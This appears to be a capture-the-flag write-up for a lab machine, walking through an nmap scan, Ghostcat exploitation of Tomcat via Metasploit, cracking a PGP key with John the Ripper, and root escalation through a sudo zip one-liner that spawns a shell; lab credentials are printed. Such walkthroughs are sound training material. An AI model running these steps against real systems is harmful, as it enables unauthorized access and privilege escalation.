# Data Gathering

### NMAP Result

```
nmap IP -sV -T4
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2023-10-08 19:23 PST
Nmap scan report for 10.10.95.16
Host is up (0.38s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
8080/tcp open  http       Apache Tomcat 9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
``
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.94 seconds

```

# Exploitation

Using metasploit we can use the tomcat_ghostcat exploit to gain access to this box

```
msfconsole
use auxiliary/admin/http/tomcat_ghostcat 
set rhost = IP
exploit
```

### Result 

At the bottom of the output we can use the credentials to login in the ssh
```
<description>
    Welcome to GhostCat
	skyfuck:8730281lkjlkjdqlksalks
</description>
```


## Flag 1

```
cat /home/merlin/user.txt
```

# Privilege Escalation

Using the 'ls' command we can see that /home/skyfuck have a credentials.pgp and tryhackme.asc. I downloaded the tryhackme.asc to my machine and tried to crack it using john the ripper

First we are going convert this file using gpg2john
```
gpg2jogn tryhackme.asc > hash
```
Now it is converted we can now use john to bruteforce this file. I am using the rockyou wordlist to crack this file
```
john --wordlist=/path/to/rockyou.txt hash
```
I have successfully cracked this file
```
tryhackme:alexandru:::tryhackme <stuxnet@tryhackme.com>::raw_gpg

1 password hash cracked, 0 left
```
Now we have the passphrase all we have to do is import the key and decrypt the pgp file 
```
gpg --import tryhackme.asc
gpg -d credential.pgp
```
The result is merlin's account username:password and we can use merlins account 
```
su merlin
```
Using sudo -l we can check what we can run as root
```
merlin@ubuntu:/home/skyfuck$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip

```
It seems like we can run zip as root so I have search gtfobins.github.io on how we can use zip to escalate 

Using there commands we can escalate to root
```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

After that we have gained root privileges on the machine and we can view the second flag 
```
# whoami
root
# cd /root
# cat root.txt
```
